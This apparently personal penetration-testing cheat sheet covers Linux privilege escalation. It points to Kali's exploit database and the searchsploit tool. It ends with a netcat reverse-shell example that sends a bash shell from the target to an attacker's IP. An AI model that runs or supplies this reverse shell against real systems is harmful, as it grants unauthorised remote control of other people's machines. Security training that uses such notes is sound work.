== Privilege escalation on linux systems ==

Kali has a DB of ___UNVERIFIED___ linux exploits under:

		/user/share/exploitdb


	-- Use those at your own risk.
	It might work. It might wipe your root drive. (Check the code at least)

Search as follows:

# /usr/share/exploitdb/searchsploit <term>

Note: example of reverse TCP on linux:

	## On the target:
	nc <attackr_ip> <port> -e /bin/bash

	## On the attacker:
	nc -lvp <port>
